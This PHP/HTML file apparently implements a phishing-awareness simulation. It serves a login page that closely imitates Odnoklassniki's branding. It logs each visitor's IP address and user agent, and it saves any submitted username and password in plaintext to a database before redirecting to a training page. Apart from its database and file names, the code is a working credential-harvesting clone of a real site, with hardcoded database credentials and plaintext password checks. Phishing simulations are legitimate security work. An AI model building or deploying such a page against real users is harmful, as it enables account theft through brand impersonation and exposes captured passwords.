<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

session_start();

// Генерируем уникальный ID для каждого визита
function generate_visit_id() {
    return uniqid('visit_', true);
}

// Логирование посещения
function log_visit($visit_id) {
    $session_id = session_id();
    $user_ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    // Подключение к БД
    $pdo = new PDO("pgsql:host=localhost;dbname=phishing_training_2", "trainer", "secure_password");
    
    // Всегда вставляем новую запись с уникальным visit_id
    $stmt = $pdo->prepare("INSERT INTO simulation_results (session_id, visit_id, was_submitted, user_ip, user_agent) VALUES (?, ?, FALSE, ?, ?)");
    $stmt->execute([$session_id, $visit_id, $user_ip, $user_agent]);
    
    return $visit_id;
}

// Обработка формы входа
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
    $visit_id = $_POST['visit_id'] ?? '';
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if (!empty($visit_id)) {
        $pdo = new PDO("pgsql:host=localhost;dbname=phishing_training_2", "trainer", "secure_password");
        
        // ЛЮБАЯ отправка формы = фишинговая попытка
        $is_phishing_attempt = true;
        
        // Проверка корректности данных через БД
        $is_legitimate = false;
        $check_stmt = $pdo->prepare("SELECT id FROM legitimate_credentials WHERE username = ? AND password = ?");
        $check_stmt->execute([$username, $password]);

        if ($check_stmt->fetch()) {
            $is_legitimate = true;
        }

        $is_legitimate_int = $is_legitimate ? 1 : 0;
        $is_phishing_attempt_int = $is_phishing_attempt ? 1 : 0;
        
        // Обновление записи по visit_id
        $stmt = $pdo->prepare("UPDATE simulation_results SET submitted_data = ?, was_submitted = TRUE, is_legitimate = ?, is_phishing_attempt = ? WHERE visit_id = ?");
        $submitted_data = json_encode(['username' => $username, 'password' => $password]);
        $stmt->execute([$submitted_data, $is_legitimate_int, $is_phishing_attempt_int, $visit_id]);
        
        // Редирект на обучающую страницу
        header("Location: training_completed.php?visit_id=" . urlencode($visit_id));
        exit;
    }
}

// Генерируем новый visit_id для каждого визита
$visit_id = generate_visit_id();
log_visit($visit_id);
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Одноклассники | Вход</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ffa500 0%, #ff8c00 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        /* Оранжевые кольца на фоне */
        body::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: 
                radial-gradient(circle at 20% 20%, rgba(255, 165, 0, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(255, 140, 0, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 70%, rgba(255, 165, 0, 0.08) 0%, transparent 50%),
                radial-gradient(circle at 70% 30%, rgba(255, 140, 0, 0.08) 0%, transparent 50%);
            animation: float 20s infinite linear;
            z-index: -1;
        }
        
        @keyframes float {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(255, 140, 0, 0.3);
            width: 100%;
            max-width: 420px;
            overflow: hidden;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .ok-header {
            background: linear-gradient(135deg, #ff8c00 0%, #ffa500 100%);
            padding: 35px 20px;
            text-align: center;
            color: white;
            position: relative;
        }
        
        .ok-header::after {
            content: '';
            position: absolute;
            bottom: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 80%;
            height: 20px;
            background: radial-gradient(ellipse at center, rgba(255, 255, 255, 0.3) 0%, transparent 70%);
        }
        
        .ok-logo {
            width: 90px;
            height: 90px;
            background: white;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            font-weight: bold;
            color: #ff8c00;
            box-shadow: 0 6px 20px rgba(255, 140, 0, 0.4);
            border: 3px solid #ff8c00;
        }
        
        .ok-title {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 8px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        .ok-subtitle {
            font-size: 16px;
            opacity: 0.95;
            font-weight: 300;
        }
        
        .login-form {
            padding: 35px 30px 25px;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 10px;
            color: #666;
            font-size: 15px;
            font-weight: 500;
        }
        
        .form-group input {
            width: 100%;
            padding: 14px 18px;
            border: 2px solid #ffd699;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #fffaf0;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #ff8c00;
            background: white;
            box-shadow: 0 0 0 3px rgba(255, 140, 0, 0.1);
        }
        
        .form-group input::placeholder {
            color: #cc9966;
        }
        
        .login-button {
            width: 100%;
            background: linear-gradient(135deg, #ff8c00 0%, #ffa500 100%);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 10px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 140, 0, 0.4);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .login-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 140, 0, 0.6);
        }
        
        .login-button:active {
            transform: translateY(0);
        }
        
        .login-footer {
            text-align: center;
            margin-top: 25px;
            padding: 25px 30px;
            background: #fffaf0;
            border-top: 1px solid #ffd699;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 25px;
            margin-bottom: 15px;
        }
        
        .footer-links a {
            color: #ff8c00;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            transition: color 0.3s ease;
        }
        
        .footer-links a:hover {
            color: #e67300;
            text-decoration: underline;
        }
        
        .additional-options {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #ffd699;
        }
        
        .social-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 15px;
        }
        
        .social-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #ffd699;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ff8c00;
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        
        .social-btn:hover {
            background: #ff8c00;
            color: white;
            transform: scale(1.1);
        }
        
        /* Адаптивность */
        @media (max-width: 480px) {
            .login-container {
                margin: 15px;
            }
            
            .login-form {
                padding: 25px 20px 15px;
            }
            
            .ok-header {
                padding: 25px 15px;
            }
            
            .ok-logo {
                width: 70px;
                height: 70px;
                font-size: 26px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="ok-header">
            <div class="ok-logo">OK</div>
            <div class="ok-title">Одноклассники</div>
            <div class="ok-subtitle">Вход в социальную сеть</div>
        </div>
        
        <form method="POST" class="login-form">
            <input type="hidden" name="visit_id" value="<?php echo htmlspecialchars($visit_id); ?>">
            
            <div class="form-group">
                <label for="username">Логин, email или телефон</label>
                <input type="text" id="username" name="username" placeholder="Введите логин или email" required>
            </div>
            
            <div class="form-group">
                <label for="password">Пароль</label>
                <input type="password" id="password" name="password" placeholder="Введите пароль" required>
            </div>
            
            <button type="submit" name="submit" class="login-button">Войти в Одноклассники</button>
        </form>
        
        <div class="login-footer">
            <div class="footer-links">
                <a href="#">Регистрация</a>
                <a href="#">Забыли пароль?</a>
                <a href="#">Помощь</a>
            </div>
            
            <div class="additional-options">
                <div style="color: #666; font-size: 14px; margin-bottom: 10px;">Войти через социальные сети:</div>
                <div class="social-buttons">
                    <a href="#" class="social-btn">VK</a>
                    <a href="#" class="social-btn">FB</a>
                    <a href="#" class="social-btn">GG</a>
                    <a href="#" class="social-btn">MM</a>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
